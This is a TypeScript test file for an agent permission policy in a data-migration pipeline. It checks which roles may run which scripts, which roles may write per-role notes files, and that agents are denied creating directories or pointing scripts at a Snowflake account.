    const reason = new RegExp(`^script-backend: ${script.replace(/\./g, "\.")} may not be pointed at a Snowflake account from an agent session$`);
    for (const spelling of spellings) {
      for (const command of [`.venv/Scripts/python.exe ${call} ${spelling}`, `python ${script} ${spelling} ${call.split(" ").slice(1).join(" ")}`]) {
        deny(decide(role, "wf_0001", "bash", { command }, "seg_01", ROOT), reason);
      }
    }
  }
});

test("script-backend: an ordinary script call is still allowed", () => {
  for (const [role, command] of [
    ["validator", "python scripts/validate_segment.py wf_0001 seg_01"],
    ["validator", ".venv/Scripts/python.exe scripts/validate_segment.py wf_0001 seg_01 --set normal"],
    ["validator", "python scripts/validate_snowpark.py wf_0001 seg_01 --set edge"],
    ["validator", "python scripts/validate_dbt.py wf_0001"],
    ["validator", "python scripts/compare.py --expected a --actual b"],
    ["translator", "python scripts/compile_check.py wf_0001 seg_01 --target snowpark"],
    ["analyzer", "python scripts/target_check.py wf_0001 --prefer auto"],
    ["intake", "python scripts/intake_prompt.py wf_0001 --no-interactive"],
    ["parser-recovery", "python scripts/parse.py wf_0001 --check"],
  ] as const) {
    allow(decide(role, "wf_0001", "bash", { command }, "seg_01", ROOT));
  }
  // a VALUE that merely reads like a flag name is not a flag
  allow(decide("validator", "wf_0001", "bash", { command: "python scripts/validate_segment.py wf_0001 seg_01 --set backend" }, "seg_01", ROOT));
});

// ---------- output targets phase 2, Task W4: a compaction memory aid (notes files) ----------
// intake, analyzer and fixer each keep a notes file re-read after a context compaction; the
// durable record stays in the contract and the files, never the notes -- so the notes file is one
// more write lane, narrow to that one role and file, on top of (never instead of) its usual lanes.

test("intake, analyzer and fixer may write their own notes file", () => {
  allow(decide("intake", "wf_0001", "create", { path: "workflows/wf_0001/notes/intake.md" }));
  allow(decide("analyzer", "wf_0001", "create", { path: "workflows/wf_0001/notes/analyzer.md" }));
  allow(decide("fixer", "wf_0001", "edit", { path: "workflows/wf_0001/notes/fixer.md" }, "seg_01"));

  // Neither another role's own notes file, nor a role that keeps none at all.
  deny(decide("translator", "wf_0001", "create", { path: "workflows/wf_0001/notes/analyzer.md" }, "seg_01"), /translator/);
  deny(decide("analyzer", "wf_0001", "create", { path: "workflows/wf_0001/notes/fixer.md" }), /analyzer/);
  deny(decide("intake", "wf_0001", "create", { path: "workflows/wf_0001/notes/fixer.md" }), /intake/);
  deny(decide("reviewer", "wf_0001", "create", { path: "workflows/wf_0001/notes/reviewer.md" }, "seg_01"), /reviewer/);
});

test("Task W4 fix round 1: validator and documenter, which keep no notes file, may not write any notes path", () => {
  deny(decide("validator", "wf_0001", "create", { path: "workflows/wf_0001/notes/analyzer.md" }, "seg_01"), /validator/);
  deny(decide("validator", "wf_0001", "create", { path: "workflows/wf_0001/notes/validator.md" }, "seg_01"), /validator/);
  deny(decide("documenter", "wf_0001", "create", { path: "workflows/wf_0001/notes/analyzer.md" }), /documenter/);
  deny(decide("documenter", "wf_0001", "create", { path: "workflows/wf_0001/notes/documenter.md" }), /documenter/);
});

test("the analyzer's notes file is writable in a batch too, alongside (never instead of) its batch lanes", () => {
  allow(analyzerWrite("workflows/wf_0001/notes/analyzer.md", BATCH_01));
  allow(analyzerWrite("workflows/wf_0001/notes/analyzer.md")); // and unbatched, unchanged
  allow(analyzerWrite("workflows/wf_0001/segments/seg_01/contract.json", BATCH_01)); // the batch's own lane still works
  deny(analyzerWrite("workflows/wf_0001/notes/fixer.md", BATCH_01), /analyzer may not write/);
});

test("the fixer's notes file is writable in dbt scope too; the translator's is never opened at all", () => {
  allow(dbtWrite("fixer", "workflows/wf_0007/notes/fixer.md"));
  deny(dbtWrite("translator", "workflows/wf_0007/notes/fixer.md"), /translator/);
  // the fixer's own dbt project lane is unaffected by the extra notes lane
  allow(dbtWrite("fixer", "workflows/wf_0007/dbt/models/x.sql"));
  deny(dbtWrite("fixer", "workflows/wf_0007/dbt/review.json"), /fixer/);
});

// ---------- output targets phase 2, Task N1: nobody creates the notes directory itself ----------
// Live evidence (docs/live-smoke-test.md "Third live test"): every intake session tried to create
// workflows/<wf>/notes/ itself before writing its notes file -- PowerShell New-Item/md and a
// python -c makedirs call among them. The fix (orchestrator/runner.ts) creates the directory for
// the agent; the policy is unchanged and keeps denying directory creation by any agent, pinned
// here with the real tool name the SDK sends for a shell call: powershell with {command,
// description}.

test("Task N1: intake may not create the notes directory itself, by PowerShell New-Item or python -c", () => {
  deny(
    decide("intake", "wf_0001", "powershell", {
      command: "New-Item -ItemType Directory -Path workflows/wf_0001/notes -Force",
      description: "create the notes directory",
    }),
    /may not run this command/,
  );
  deny(
    decide("intake", "wf_0001", "powershell", {
      command: ".venv\\Scripts\\python.exe -c \"__import__('os').makedirs('workflows/wf_0001/notes')\"",
      description: "create the notes directory with python",
    }),
    /interpreter flag/,
  );
});
